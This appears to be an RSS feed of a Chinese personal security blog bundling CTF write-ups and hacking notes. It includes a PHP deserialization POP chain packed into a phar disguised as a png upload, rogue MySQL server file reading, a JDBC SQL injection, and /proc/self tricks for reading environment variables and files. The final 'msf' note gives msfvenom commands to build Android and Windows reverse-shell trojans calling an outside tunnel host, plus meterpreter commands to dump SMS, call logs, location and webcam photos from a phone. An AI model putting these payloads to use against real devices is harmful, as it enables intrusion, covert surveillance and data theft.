<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>网络安全 on Alex lan</title><link>http://localhost:1313/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</link><description>Recent content in 网络安全 on Alex lan</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml"/><item><title>bili_22_1024</title><link>http://localhost:1313/docs/wp/bili_22_1024/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/wp/bili_22_1024/</guid><description>&lt;p>今年比往年难,可见的,去年抄答案混分,说今年必然会做&lt;/p>
&lt;p>只做了三道题,菜&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ezinvader&lt;/p>
&lt;p>js文件里头有个颜文字,解出来有个post,直接跑密码,提示了8个星号,8位弱密码&lt;/p>
&lt;p>Aa123456,在响应头里,&lt;/p>
&lt;p>其实我自己没跑出来???&lt;/p>
&lt;p>问得别人密码,原来重置一下sessenid就行了&lt;/p>
&lt;/li>
&lt;li>
&lt;p>up&lt;/p>
&lt;p>文件上传&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php

// flag in /tmp/flag.php 


class Modifier {

 public function __invoke(){
 include(&amp;#34;index.php&amp;#34;);
 }
}

class Action {
 public $checkAccess=&amp;#39;index.php&amp;#39;;
 public $id=&amp;#39;0a&amp;#39;;

 public function run()
 { 
 if(strpos($this-&amp;gt;checkAccess, &amp;#39;upload&amp;#39;) !== false){ 
 echo &amp;#34;error path&amp;#34;;
 exit();
 } 

 if ($this-&amp;gt;id !== 0 &amp;amp;&amp;amp; $this-&amp;gt;id !== 1) {
 switch($this-&amp;gt;id) {
 case 0:
 if ($this-&amp;gt;checkAccess) {
 include($this-&amp;gt;checkAccess);
 }
 break;
 case 1:
 throw new Exception(&amp;#34;id invalid in &amp;#34;.__CLASS__.__FUNCTION__);
 break;
 default:
 break; 
 }
 }
 }

}

class Content {

 public $formatters;

 public function getFormatter($formatter)//close
 {
 echo $formatter,&amp;#39;-----&amp;#39;;
 if (isset($this-&amp;gt;formatters[$formatter])) {
 echo &amp;#39;222222222222&amp;#39;;
 return $this-&amp;gt;formatters[$formatter];
 }

 foreach ($this-&amp;gt;providers as $provider) {
 if (method_exists($provider, $formatter)) {
 $this-&amp;gt;formatters[$formatter] = array($provider, $formatter);
 return $this-&amp;gt;formatters[$formatter];
 }
 }
 throw new \InvalidArgumentException(sprintf(&amp;#39;Unknown formatter &amp;#34;%s&amp;#34;&amp;#39;, $formatter));
 }

 public function __call($name, $arguments)
 {
 $a=$this-&amp;gt;getFormatter($name);
 echo $a;
 return call_user_func_array($a, $arguments);
 }
}

class Show{
 public $source;
 public $str;
 public $reader;
 public function __construct($file=&amp;#39;index.php&amp;#39;) {
 $this-&amp;gt;source = $file;
 echo &amp;#39;Welcome to &amp;#39;.$this-&amp;gt;source.&amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
 }
 public function __toString() {
 echo &amp;#39;string--------&amp;#39;;
 $this-&amp;gt;str-&amp;gt;reset();
 return &amp;#39;&amp;#39;;
 }

 public function __wakeup() {

 if(preg_match(&amp;#34;/gopher|phar|http|file|ftp|dict|\.\./i&amp;#34;, $this-&amp;gt;source)) {
 throw new Exception(&amp;#39;invalid protocol found in &amp;#39;.__CLASS__);
 echo &amp;#39;111111111111111111&amp;#39;;
 }
 }

 public function reset() {

 if ($this-&amp;gt;reader !== null) {
 echo &amp;#39;reset----&amp;#39;; 
 $this-&amp;gt;reader-&amp;gt;close();
 }
 }
}
$a=new Show();
$a-&amp;gt;str=&amp;#39;1&amp;#39;;
$b=new Show;
$b-&amp;gt;reader=&amp;#39;1&amp;#39;;

$d=new Content;
$d-&amp;gt;formatters[&amp;#39;close&amp;#39;]=array(new Action,&amp;#39;run&amp;#39;);

$a-&amp;gt;reader=$d;
$b-&amp;gt;str=$a;


$c=new Show($b);
$c-&amp;gt;str=&amp;#39;1&amp;#39;;
$c-&amp;gt;reader=&amp;#39;1&amp;#39;;


// $a=&amp;#39;O:4:&amp;#34;Show&amp;#34;:3:{s:6:&amp;#34;source&amp;#34;;O:4:&amp;#34;Show&amp;#34;:3:{s:6:&amp;#34;source&amp;#34;;s:9:&amp;#34;index.php&amp;#34;;s:3:&amp;#34;str&amp;#34;;O:4:&amp;#34;Show&amp;#34;:3:{s:6:&amp;#34;source&amp;#34;;s:9:&amp;#34;index.php&amp;#34;;s:3:&amp;#34;str&amp;#34;;s:1:&amp;#34;1&amp;#34;;s:6:&amp;#34;reader&amp;#34;;O:7:&amp;#34;Content&amp;#34;:1:{s:10:&amp;#34;formatters&amp;#34;;a:1:{s:5:&amp;#34;close&amp;#34;;a:2:{i:0;O:6:&amp;#34;Action&amp;#34;:2:{s:11:&amp;#34;checkAccess&amp;#34;;s:9:&amp;#34;index.php&amp;#34;;s:2:&amp;#34;id&amp;#34;;s:2:&amp;#34;0a&amp;#34;;}i:1;s:3:&amp;#34;run&amp;#34;;}}}}s:6:&amp;#34;reader&amp;#34;;s:1:&amp;#34;1&amp;#34;;}s:3:&amp;#34;str&amp;#34;;s:1:&amp;#34;1&amp;#34;;s:6:&amp;#34;reader&amp;#34;;s:1:&amp;#34;1&amp;#34;;}&amp;#39;;
// unserialize($a)


//show _construct _tostring reset content _call close ,$this-&amp;gt;formatters【&amp;#39;close&amp;#39;】 = 【new Action(), &amp;#39;run&amp;#39;】


$phar=new phar(&amp;#39;test.phar&amp;#39;);
$phar-&amp;gt;startBuffering();
$phar-&amp;gt;setStub(&amp;#34;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#34;);
$phar-&amp;gt;setMetadata($c);
$phar-&amp;gt;addFromString(&amp;#34;flag.txt&amp;#34;,&amp;#34;flag&amp;#34;);
$phar-&amp;gt;stopBuffering();

?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>改了后缀png,上传上去,触发&lt;/p></description></item><item><title>fake-mysql</title><link>http://localhost:1313/docs/network-security/tools/fake-mysql/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/tools/fake-mysql/</guid><description>&lt;h2 id="fake-mysql">
 fake mysql
 &lt;a class="anchor" href="#fake-mysql">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/allyshka/Rogue-MySql-Server">大佬的github&lt;/a>&lt;/p>
&lt;p>python3似乎也可运行&lt;/p>
&lt;pre tabindex="0">&lt;code>python2/3 roguemysqlserver.py
&lt;/code>&lt;/pre>&lt;p>不要开启mysql ，关掉，&lt;code>filelist&lt;/code>里头是你要读取的文件，外部连接时，会出现类似与报错的输出，这时候看mysql.log&lt;/p>
&lt;p>已经有读取内容了&lt;/p>
&lt;p>别人连接你的mysql，也需要加 -u -p,除非无密码&lt;/p>
&lt;p>吃饭去了&lt;/p></description></item><item><title>java sql 注入</title><link>http://localhost:1313/docs/network-security/java/sql%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/java/sql%E6%B3%A8%E5%85%A5/</guid><description>&lt;h2 id="jdbc-sql注入">
 JDBC sql注入
 &lt;a class="anchor" href="#jdbc-sql%e6%b3%a8%e5%85%a5">#&lt;/a>
&lt;/h2>
&lt;p>jdbc类似于url解析&lt;/p>
&lt;p>输入myapp#&amp;rsquo; union select 1#&lt;/p>
&lt;pre tabindex="0">&lt;code>jdbc:mysql://mysqldbserver:3360/myapp#&amp;#39; union select 1#
解析成下面
jdbc:mysql://mysqldbserver:3360/myapp
&lt;/code>&lt;/pre>&lt;p>再代入sql语句&lt;/p>
&lt;pre tabindex="0">&lt;code>select * from user where name=&amp;#39;#&amp;#39; union select 1#&amp;#39; and pwd =&amp;#39;&amp;#34;+pwd+&amp;#34;&amp;#39;
&lt;/code>&lt;/pre>&lt;p>第一个单引号包裹了，#成了字符串，第二个#注释后面&lt;/p></description></item><item><title>linux 知识点</title><link>http://localhost:1313/docs/network-security/other/linux/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/other/linux/</guid><description>&lt;h2 id="软连接">
 软连接
 &lt;a class="anchor" href="#%e8%bd%af%e8%bf%9e%e6%8e%a5">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>在 linux 中，/proc/self/cwd/会指向进程的当前目录，在不知道 flask 工作目录时，我们可以用/proc/self/cwd/flag/flag.jpg来访问 flag.jpg。&lt;/li>
&lt;li>ln -s是Linux的软连接命令,其类似与windows的快捷方式。比如ln -s /etc/passwd shawroot 这会出现一个名为shawroot的文件,其内容为/etc/passwd的内容。&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>ln -s /proc/self/cwd/flag/flag.jpg shaw
zip -ry root.zip shaw
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>-r：将指定的目录下的所有子目录以及文件一起处理

-y：直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。
&lt;/code>&lt;/pre>&lt;h2 id="procself">
 /proc/self
 &lt;a class="anchor" href="#procself">#&lt;/a>
&lt;/h2>
&lt;p>proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。&lt;/p>
&lt;p>还有的是一些以数字命名的目录，他们是进程目录，系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的PID号为目录名，他们是读取进程信息的接口&lt;/p>
&lt;ul>
&lt;li>cmdline&lt;/li>
&lt;/ul>
&lt;p>cmdline 文件存储着启动当前进程的完整命令&lt;/p>
&lt;pre tabindex="0">&lt;code>cat /proc/1083/cmdline
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>cwd&lt;/li>
&lt;/ul>
&lt;p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录&lt;/p>
&lt;pre tabindex="0">&lt;code>ls -al /proc/1083/cwd
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>ls -al /proc/1090/exe
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>environ&lt;/p>
&lt;p>environ文件存储着当前进程的环境变量列表，通过查看environ目录来获取指定进程的环境变量信息&lt;/p>
&lt;pre tabindex="0">&lt;code>cat /proc/2889/environ
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>fd&lt;/p>
&lt;p>里面包含着当前进程打开的每一个文件的描述符(路径)&lt;/p>
&lt;pre tabindex="0">&lt;code>ls -al /proc/1083/fd /proc/self表示当前进程目录
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>/proc/self表示当前进程目录，在过滤了很多字符时就用，比如目录穿越，任意文件等&lt;/p>
&lt;pre tabindex="0">&lt;code>/proc/self
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul></description></item><item><title>LOVE_math</title><link>http://localhost:1313/docs/wp/love_math/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/wp/love_math/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">error_reporting&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//听说你很喜欢数学，不知道你是否爱它胜过爱flag
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;c&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">show_source&lt;/span>(&lt;span style="color:#66d9ef">__FILE__&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//例子 c=20-1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $content &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;c&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strlen&lt;/span>($content) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">60&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;太长了不会算&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $blacklist &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;\t&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;\r&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;\n&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;\&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;&amp;#34;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;`&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;\[&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;\]&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">foreach&lt;/span> ($blacklist &lt;span style="color:#66d9ef">as&lt;/span> $blackitem) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $blackitem &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/m&amp;#39;&lt;/span>, $content)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;请不要输入奇奇怪怪的字符&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $whitelist &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;abs&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;acos&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;acosh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;asin&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;asinh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;atan2&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;atan&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;atanh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;bindec&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;ceil&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;cos&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;cosh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;decbin&amp;#39;&lt;/span> , &lt;span style="color:#e6db74">&amp;#39;decoct&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;deg2rad&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exp&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;expm1&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;floor&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;fmod&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;getrandmax&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hexdec&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hypot&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;is_finite&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;is_infinite&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;is_nan&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;lcg_value&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;log10&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;log1p&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;log&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;max&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;min&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;mt_getrandmax&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;mt_rand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;mt_srand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;octdec&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;pi&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;pow&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rad2deg&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;round&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sin&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sinh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sqrt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;srand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;tan&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;tanh&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">preg_match_all&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&amp;#39;&lt;/span>, $content, $used_funcs);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">foreach&lt;/span> ($used_funcs[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#66d9ef">as&lt;/span> $func) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">in_array&lt;/span>($func, $whitelist)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;请不要输入奇奇怪怪的函数&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//帮你算出答案
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">eval&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;echo &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$content&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;;&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>好骚的姿势啊&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$payload &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;abs&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;acos&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;acosh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;asin&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;asinh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;atan2&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;atan&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;atanh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;bindec&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;ceil&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;cos&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;cosh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;decbin&amp;#39;&lt;/span> , &lt;span style="color:#e6db74">&amp;#39;decoct&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;deg2rad&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exp&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;expm1&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;floor&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;fmod&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;getrandmax&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hexdec&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hypot&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;is_finite&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;is_infinite&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;is_nan&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;lcg_value&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;log10&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;log1p&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;log&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;max&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;min&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;mt_getrandmax&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;mt_rand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;mt_srand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;octdec&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;pi&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;pow&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rad2deg&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;round&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sin&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sinh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sqrt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;srand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;tan&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;tanh&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span>($k&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;$k&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#a6e22e">sizeof&lt;/span>($payload);$k&lt;span style="color:#f92672">++&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;$i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span>; $i&lt;span style="color:#f92672">++&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;$j &lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>;$j&lt;span style="color:#f92672">++&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $exp &lt;span style="color:#f92672">=&lt;/span> $payload[$k] &lt;span style="color:#f92672">^&lt;/span> $i&lt;span style="color:#f92672">.&lt;/span>$j;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span>($payload[$k]&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;^&lt;/span>&lt;span style="color:#e6db74">$i$j&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;==&amp;gt;&lt;/span>&lt;span style="color:#e6db74">$exp&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;br /&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>字符串异或&lt;/p></description></item><item><title>msf</title><link>http://localhost:1313/docs/hack/msf/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/hack/msf/</guid><description>&lt;h2 id="android">
 Android
 &lt;a class="anchor" href="#android">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>msfvenom -p payload LHOST=本地地址 LPORT=本地端口 -f 文件类型 -o 木马文件
&lt;/code>&lt;/pre>&lt;p>如&lt;/p>
&lt;pre tabindex="0">&lt;code>msfvenom -p android -p android/meterpreter/reverse_tcp LHOST=192.168.43.97 LPORT=5555 R&amp;gt; demo.apk
&lt;/code>&lt;/pre>&lt;p>启动msfconsole&lt;/p>
&lt;pre tabindex="0">&lt;code>use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 192.168.134.129
set lport 555
exploit/run
&lt;/code>&lt;/pre>&lt;p>在手机上启动&lt;/p>
&lt;pre tabindex="0">&lt;code>sysinfo //查看手机信息
app_list //查看安装的app
webcam_snap //拍照
dump_sms //查看短信
dump_calllog //通讯录
geolocate //GPS
screenshot //jx&amp;#39;py
&lt;/code>&lt;/pre>&lt;h2 id="win">
 Win
 &lt;a class="anchor" href="#win">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=free.idcfengye.com LPORT=10189 -f exe -o 123.exe
&lt;/code>&lt;/pre>&lt;p>启动msfconsole&lt;/p>
&lt;p>free.idcfengye.com&lt;/p>
&lt;pre tabindex="0">&lt;code>use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost free.idcfengye.com
set lport 1234
run/exploit
